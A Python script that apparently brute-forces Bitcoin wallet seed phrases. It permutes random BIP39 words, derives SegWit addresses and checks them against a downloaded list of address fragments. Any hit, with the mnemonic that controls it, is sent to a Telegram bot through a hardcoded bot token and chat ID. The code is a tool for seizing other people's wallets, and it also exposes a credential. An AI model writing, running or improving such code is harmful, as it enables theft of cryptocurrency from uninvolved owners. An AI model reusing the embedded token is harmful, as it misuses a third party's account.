import os
import itertools
import random
from mnemonic import Mnemonic
import hashlib
from Crypto.Hash import RIPEMD160
from bip32utils import BIP32Key
import bech32
import time
import math
import multiprocessing
import requests
import urllib.request
from typing import List
import sqlite3


# =================== Fake HashLib for ripemd160 ===================
HashLib_Original = hashlib.new
def HashLib_Fake(name, data):
    if name == 'ripemd160':
        r160 = RIPEMD160.new()
        r160.update(data)
        return r160
    else:
        return HashLib_Original(name, data)
hashlib.new = HashLib_Fake
# =================== Fake HashLib for ripemd160 ===================
# MAX     = 100_000 #per core
MAX       = 10_000  #per core
M         = Mnemonic("english")
H         = 0x80000000 
F         = "0"
cpu_count = multiprocessing.cpu_count()
FILE      = f"https://github.com/JikkkoNikiGFD1930/0/releases/download/v0/{F}"
conn      = sqlite3.connect('Records.db')
cursor    = conn.cursor()

def store_records_from_file(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if line:
                cursor.execute('INSERT OR IGNORE INTO records (record) VALUES (?)', (line,))
    conn.commit()
def exists(record):
    cursor.execute('SELECT 1 FROM records WHERE record = ? LIMIT 1', (record,))
    return cursor.fetchone() is not None
def format_size(bytes_size):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_size < 1024:
            return f"{bytes_size:.2f} {unit}"
        bytes_size /= 1024
def check_file_downloaded():
    if not os.path.exists(F):
        print("üî¥ File not found. Downloading...")
        urllib.request.urlretrieve(FILE, F)
        file_size = format_size(os.path.getsize(F))
        print(f"‚úÖ Download complete. File Size: {file_size}")
    if not os.path.exists(F):
        print("üèÅ File Not Downloaded! üî¥\nProgram Died!\n‚ùå‚ùå‚ùå‚ùå‚ùå")
        exit(0)
def format_seconds(seconds):
    seconds = round(seconds)
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    sec = seconds % 60
    return f"{hours}h:{minutes}m:{sec}s"
def wordsINorder( mnemo ):
    indexed_words = []
    for word in mnemo:
        if word in M.wordlist:
            index = M.wordlist.index(word)
            indexed_words.append((word, index))
    indexed_words.sort(key=lambda x: x[1])
    str = []
    for word, index in indexed_words:
        str.append(f"{word}({index+1})")
    output = "üèÅ " + ("|".join(str))
    print( output )
    return output
def encode_segwit_address(pubkey_hash):
    witness_version = 0
    witprog = bech32.convertbits(pubkey_hash, 8, 5)
    return bech32.bech32_encode("bc", [witness_version] + witprog)
def make(words):
    # start_time   = time.time()
    seed = M.to_seed(words)
    bip32_root_key = BIP32Key.fromEntropy(seed)
    bip32_child_key = bip32_root_key.ChildKey(84 + H) \
                                .ChildKey(0 + H) \
                                .ChildKey(0 + H) \
                                .ChildKey(0) \
                                .ChildKey(0)
    public_key = bip32_child_key.PublicKey()
    sha256_hash = hashlib.sha256(public_key).digest()
    ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
    segwit_address = encode_segwit_address(ripemd160_hash)
    # print("Mnemonic:", words)
    # print("Public Key (HEX):", public_key.hex())
    # print("Bitcoin Address:", segwit_address)
    # elapsed_time = time.time() - start_time
    # print(f"üü°  make wallet Elapsed time: {elapsed_time:.6f} seconds")
    return segwit_address
def search( address, P ):
    # print( address )
    # start_time   = time.time()
    result       = exists(f"{ address[3:15] }")
    # elapsed_time = time.time() - start_time
    # print(f"‚ùå { address[3:15] } search_in_memory Elapsed time: {elapsed_time:.6f} seconds")
    if(result):
        print(f"‚úÖ Found {address}\n{P}")
        notify(f"‚úÖ Found {address}\n{P}")
        return result
    # else:
        # print("üî¥ NotFound")
    return False
def notify(msg, message_id=None, type="success", retries=5, delay=2 ):
    for attempt in range(retries):
        try:
            if message_id:
                # Edit an existing message if message_id is passed
                response = requests.post("https://api.telegram.org/bot7306877915:AAHR-EDl87kj1eiLVWUxyiHnaQoiJUTW8Fc/editMessageText",
                                        data={"chat_id": "567639577", "message_id": message_id, "text": msg, "parse_mode": "Markdown"})
            else:
                # Send a new message if message_id is not passed
                response = requests.post("https://api.telegram.org/bot7306877915:AAHR-EDl87kj1eiLVWUxyiHnaQoiJUTW8Fc/sendMessage",
                                        data={"chat_id": "567639577", "text": msg, "parse_mode": "Markdown"}) 
            response_data = response.json()
            if response.status_code == 200 and "result" in response_data:
                if not message_id:
                    return response_data["result"]["message_id"] 
                return True
            else:
                print( "üî¥ Telegram Error: ", response_data )
            time.sleep(delay)
        except Exception as e:
            print(f"‚ö†Ô∏è Telegram Connection failed [notify_{type}] (Attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                time.sleep(delay)
            else:
                print(f"‚ùå Telegram Max retries reached. [notify_{type}]")
                print("Message was:")
                print(msg)
                return None


def worker(prefixes: List[tuple], data: List[int]):
    # if using SQLITE3, will speed up? [must be tested, gpt says NO!]
    # print( "[worker] Core Share: ", s(prefixes), (data) )
    valid = 0
    Attemps = 0
    Total = 0
    start_time = time.time()
    for prefix in prefixes:
        rest = [x for x in data if x not in prefix]
        if Attemps >= MAX:
            break
        for p in itertools.permutations(rest):
            mnemonic = " ".join( prefix + p ).strip()
            Total += 1
            # print(mnemonic)
            # start_time = time.time()
            status = M.check(mnemonic)
            if status:
                wallet = make(mnemonic)
                search( wallet, mnemonic )
                valid += 1
                Attemps += 1
            # print(f"‚ú≥Ô∏è Total Process of ({status}) took {time.time() - start_time:.10f}")
            
            if Attemps >= MAX:
                break
    print(f"‚ú≥Ô∏è CPU Done with ({Attemps}) Attemps / ({valid}) valid / ({Total}) Total / IN {time.time() - start_time:.10f}")
    return valid


def search_worker( words ):
    for m in words:
        # start_time = time.time()
        search( make(m), m )
        # end_time = time.time()
        # print(f"search[make+sqlite] took {end_time - start_time:.6f}")
def split_data_evenly(data, num_chunks):
    avg_size = len(data) // num_chunks
    remainder = len(data) % num_chunks
    chunks = []
    start = 0

    for i in range(num_chunks):
        end = start + avg_size + (1 if i < remainder else 0)
        chunks.append(data[start:end])
        start = end

    return chunks

def start():
    selected_words = random.sample(M.wordlist, 12)
    WIO = wordsINorder( selected_words )
    message_id = notify(f"üïî Start ...\nüèÅ Using *{cpu_count}* CPU CORES\nWords: ``` {' '.join(selected_words)}```")
    data = selected_words
    prefix_pairs = list(itertools.permutations(data, 2))

    chunks = [[] for _ in range(cpu_count)]
    for i, p in enumerate(prefix_pairs):
        chunks[i % cpu_count].append(p)

    start_time = time.time()

    with multiprocessing.Pool(cpu_count) as pool:
        results = pool.starmap(worker, [(chunk, data) for chunk in chunks])
    
    # valid_seeds = [item for sublist in results for item in sublist]
    valid_seeds = sum(results)
    
    print(f"üü¢üü¢üü¢ valid Seeds: {valid_seeds:,} in { format_seconds((time.time()) - start_time) }")
    
    all_perms = math.factorial( len(selected_words) )
    
    print(f"üü¢üü¢üü¢ ALL: {all_perms:,}")


    # chunks = split_data_evenly(valid_seeds, cpu_count) 
    
    # with multiprocessing.Pool(cpu_count) as pool:
    #     pool.map(search_worker, chunks)
        
    end_time = time.time()

    if (valid_seeds) > 0:
        z = float((valid_seeds)/all_perms * 100)
        output = f"‚úÖ [% {z:.6f} VALID] | found {(valid_seeds):,} valid seeds amoung {all_perms:,}| {(MAX*cpu_count):,} | Generated in {end_time - start_time:.2f} seconds"
        print(output)
    else:
        z = 0.00
        output = f"‚úÖ {(all_perms):,} Generated in {end_time - start_time:.2f} seconds"
        print(output)
        
    notify(f"üèÅ *Cores*: ‚ö°Ô∏è*x{cpu_count}*\n‚ö†Ô∏è *Words*: ``` { (' '.join(selected_words)) }```\nüü¢ *Valid: * ```{(valid_seeds):,}```\nüéÅ *All:* ```{all_perms:,}```\nüíØ *Percentage:* ```{z:.6f} ```\nüïî *Time:* ```{format_seconds(end_time - start_time)}```", message_id)

if __name__ == '__main__':
    # ========== Adding Records ==========
    start_time = time.time()
    print("üîÑ Initializing.... Please wait... üôè")
    check_file_downloaded()
    # cursor.execute('''CREATE TABLE IF NOT EXISTS records (record TEXT PRIMARY KEY)''')
    # store_records_from_file(F)
    print(f"‚úÖ Records Added in: { time.time() - start_time } seconds")
    # ========== Adding Records ==========
    
    print(f"üèÅ Using {cpu_count} CPU CORES")
    start()
    print("üèÅ Done")
